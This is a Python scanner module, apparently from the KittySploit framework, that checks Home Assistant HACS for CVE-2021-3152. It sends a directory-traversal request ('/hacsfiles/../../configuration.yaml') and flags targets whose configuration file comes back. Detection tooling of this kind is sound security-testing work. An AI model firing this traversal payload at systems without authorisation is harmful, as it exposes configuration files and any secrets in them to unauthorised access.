#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Home Assistant before 2021."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Home Assistant HACS - Local File Inclusion Detection',
        'description': 'Home Assistant before 2021.1.3 lacks a protection layer against directory-traversal attacks in custom integrations, letting attackers access arbitrary files, exploit requires attacker to deploy malicious custom integration.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2021', 'hacs', 'homeassistant', 'lfi'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://nvd.nist.gov/vuln/detail/CVE-2021-3152',
            'https://lyghtnox.gitlab.io/posts/hacs-exploit/',
            'https://www.home-assistant.io/blog/2021/01/22/security-disclosure/',
            'https://github.com/hacs/integration/commit/f2b7cb711e41a94b81610f6ff96ea314e9879114',
        ],
        'cve': 'CVE-2021-3152',
    }

    def run(self):
        path = '/hacsfiles/../../configuration.yaml'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_any = ('default_config:', 'homeassistant:',)
        if any(m in body for m in body_any):
            self.set_info(severity='high', reason='Home Assistant HACS - Local File Inclusion detected', path=path)
            return True
        return False

